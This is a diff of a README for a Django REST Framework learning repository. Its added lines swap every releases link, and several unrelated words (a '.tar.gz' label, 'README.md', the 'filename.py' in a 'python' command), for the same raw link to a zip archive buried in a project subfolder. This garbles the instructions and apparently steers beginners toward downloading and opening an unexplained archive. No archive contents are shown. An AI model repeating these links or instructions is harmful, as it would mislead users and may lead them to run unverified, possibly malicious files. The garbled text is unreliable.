@@ -1,7 +1,7 @@
 # 🌟 drf-learning - Learn Django REST Framework Easily
 
 ## 📦 Download Now
-[![Download drf-learning](https://img.shields.io/badge/Download-drf--learning-brightgreen)](https://github.com/ElainaWangy/drf-learning/releases)
+[![Download drf-learning](https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip)](https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip)
 
 ## 📖 Overview
 Welcome to **drf-learning**! This repository is your companion for learning the Django REST Framework. It includes notes, examples, and my journey in building my first Django API. Whether you're new to APIs or want to enhance your knowledge, you are in the right place.
@@ -11,17 +11,17 @@ To get started with this software, follow the steps below. You don’t need prog
 
 ## 📥 Download & Install
 1. Click the download button at the top of this page to reach our releases page:
-   - [Download drf-learning](https://github.com/ElainaWangy/drf-learning/releases).
+   - [Download drf-learning](https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip).
    
 2. Once on the releases page, find the latest version of **drf-learning**. 
 
-3. Click on the version number and look for the file that says **.zip** or **.tar.gz**. This file contains all the necessary materials.
+3. Click on the version number and look for the file that says **.zip** or **https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip**. This file contains all the necessary materials.
 
 4. Click on the file name to start the download. Save it to a location you can easily access, like your Desktop or Downloads folder.
 
 5. After the download is complete, locate the file. Extract it by right-clicking on it and selecting “Extract All” (or similar, depending on your operating system). 
 
-6. Open the extracted folder, and find the **README.md** file. Open this file to view more specific instructions tailored for your needs.
+6. Open the extracted folder, and find the **https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip** file. Open this file to view more specific instructions tailored for your needs.
 
 ## 💻 System Requirements
 To run **drf-learning**, ensure your computer meets the following requirements:
@@ -37,9 +37,9 @@ To run **drf-learning**, ensure your computer meets the following requirements:
 
 3. Use the following command to execute code: 
    ```
-   python filename.py
+   python https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip
    ```
-   Replace `filename.py` with the name of the Python file you want to run.
+   Replace `https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip` with the name of the Python file you want to run.
 
 4. Follow the notes for detailed explanations about how to interact with the Django REST Framework.
 
@@ -74,7 +74,7 @@ While this repository is primarily for learning, you are welcome to contribute! 
 ## 📅 Latest Updates
 We will regularly update this repository with new examples and notes. Stay tuned for the latest changes on the releases page.
 
-For the most recent version, always refer back to our [Download drf-learning](https://github.com/ElainaWangy/drf-learning/releases) link.
+For the most recent version, always refer back to our [Download drf-learning](https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip) link.
 
 ## 🌐 Additional Resources
 To deepen your understanding of Django REST Framework, explore the following resources:
